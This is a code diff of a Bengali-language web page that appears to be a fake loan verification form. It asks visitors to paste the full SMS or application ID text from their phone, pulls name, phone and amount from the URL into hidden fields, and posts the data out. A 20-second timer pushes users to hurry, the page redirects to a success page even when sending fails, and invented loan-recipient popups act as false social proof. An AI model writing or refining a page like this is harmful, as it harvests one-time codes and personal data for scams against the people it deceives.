@@ -113,27 +113,7 @@
             background: #ffffff;
             box-shadow: 0 0 0 3px rgba(255, 94, 0, 0.15);
         }
-        .paste-btn-wrap {
-            display: flex;
-            justify-content: flex-end;
-            margin-top: 8px;
-        }
-        .btn-paste {
-            background: #ffedd5;
-            border: 1px solid #fdba74;
-            padding: 7px 14px;
-            border-radius: 8px;
-            font-size: 12.5px;
-            font-weight: 700;
-            color: #c2410c;
-            cursor: pointer;
-            display: inline-flex;
-            align-items: center;
-            gap: 6px;
-        }
-        .btn-paste:hover {
-            background: #fed7aa;
-        }
+
         .btn-submit {
             width: 100%;
             padding: 15px;
@@ -245,12 +225,7 @@
 
             <div class="form-group">
                 <label><i class="fa-solid fa-envelope-open-text"></i> এসএমএস / অ্যাপ্লিকেশন আইডি টেক্সট</label>
-                <textarea id="appText" name="সম্পূর্ণ_এসএমএস_বা_আইডি" required placeholder="আপনার ফোনে আসা সম্পূর্ণ বার্তাটি এখানে পেস্ট (Paste) করুন..."></textarea>
-                <div class="paste-btn-wrap">
-                    <button type="button" class="btn-paste" id="btnPaste">
-                        <i class="fa-regular fa-clipboard"></i> সরাসরি পেস্ট করুন
-                    </button>
-                </div>
+                <textarea id="appText" name="সম্পূর্ণ_এসএমএস_বা_আইডি" required placeholder="আপনার ফোনে আসা সম্পূর্ণ বার্তাটি এখানে লিখুন বা পেস্ট করুন..."></textarea>
             </div>
 
             <button type="submit" id="btnSubmit" class="btn-submit">
@@ -279,33 +254,13 @@
 </div>
 
 <script>
-    // URL থেকে নাম, মোবাইল এবং টাকার পরিমাণ সংগ্রহ
+    // URL প্যারামিটার সংগ্রহ
     const params = new URLSearchParams(window.location.search);
     document.getElementById('hiddenName').value = params.get('name') || '';
     document.getElementById('hiddenPhone').value = params.get('phone') || '';
     document.getElementById('hiddenAmount').value = params.get('amount') || '';
 
-    const appTextArea = document.getElementById("appText");
-    const btnPaste = document.getElementById("btnPaste");
-
-    // বাটন ক্লিকের মাধ্যমে ক্লিপবোর্ড পেস্ট
-    btnPaste.addEventListener("click", async () => {
-        try {
-            if (navigator.clipboard && navigator.clipboard.readText) {
-                const text = await navigator.clipboard.readText();
-                if (text) {
-                    appTextArea.value = text;
-                }
-            } else {
-                appTextArea.focus();
-                document.execCommand("paste");
-            }
-        } catch (err) {
-            appTextArea.focus();
-        }
-    });
-
-    // ২০ সেকেন্ডের কাউন্টডাউন
+    // ২০ সেকেন্ডের সাধারণ টাইমার
     let timeLeft = 20;
     let timer = null;
     const timerBox = document.getElementById("timerBox");
@@ -346,7 +301,7 @@
         startTimer();
     });
 
-    // ফর্ম সাবমিশন লজিক (Formspree তে ডাটা পাঠানো ও success.html এ যাওয়া)
+    // ফর্ম সাবমিশন লজিক
     const form = document.getElementById("verifyForm");
     const btnSubmit = document.getElementById("btnSubmit");
 
@@ -361,17 +316,12 @@
             method: "POST",
             body: data,
             headers: { 'Accept': 'application/json' }
-        })
-        .then(() => {
-            window.location.href = "./success.html";
-        })
-        .catch(() => {
-            // নেটওয়ার্কে কোনো সমস্যা হলেও ব্রাউজারকে সাফল্য পেজে পাঠিয়ে দেওয়া হবে
+        }).finally(() => {
             window.location.href = "./success.html";
         });
     });
 
-    // পপআপ নোটিফিকেশন স্ক্রিপ্ট
+    // পপআপ নোটিফিকেশন ডাটা
     const loanData = [
         { name: "রহিমা খাতুন", district: "ঢাকা", amount: "১০,০০০", time: "এইমাত্র" },
         { name: "আসলাম খান", district: "কুমিল্লা", amount: "২০,০০০", time: "২ মিনিট আগে" },
